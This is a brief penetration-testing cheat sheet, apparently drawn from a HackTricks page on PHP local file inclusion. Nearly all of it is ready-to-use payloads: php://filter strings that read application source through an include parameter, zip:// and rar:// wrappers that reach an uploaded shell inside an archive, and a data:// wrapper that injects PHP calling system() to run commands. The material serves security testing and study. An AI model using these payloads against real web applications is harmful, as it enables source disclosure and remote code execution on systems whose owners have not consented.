https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion

#### Read PHP files
When enumerating web apps, sometimes you need to look at source code of PHP files but their execution prevents you --
	this allows you to read it
```
# php://filter wrapper summarized

Attempt 1: Clear text
	index.php?file=php://filter/resource=<file> # NO EXTENSION

Attempt 2: Encoded   #sometimes this is necessary
	index.php?file=php://filter/convert.base64-encode/resource=<file> #NO EXTENSION
```

#### Accessing Inside Compressed Files (ZIP and RAR)
Sometimes you may be able to upload files that automatically get compressed to zip or rar format. This wrapper allows you to access the php file within the zip file that you uploaded:
```
# zip wrapper summarized

index.php?page=zip://<path_to_zip_file>/<zip_file>.zip%23<shell> # NO EXTENSION


# rar wrapper summarized

index.php?page=rar://<path_to_rar_file>/<rar_file>.rar%23<shell> # NO EXTENSION
```

#### Embed Data Elements
Sometimes you are able to achieve code execution by embedding data elements
	kinda infrequent
```
# data:// wrapper summarized

index.php?page=data://text/plain,<?php%20echo%20system('<cmd>');?>
```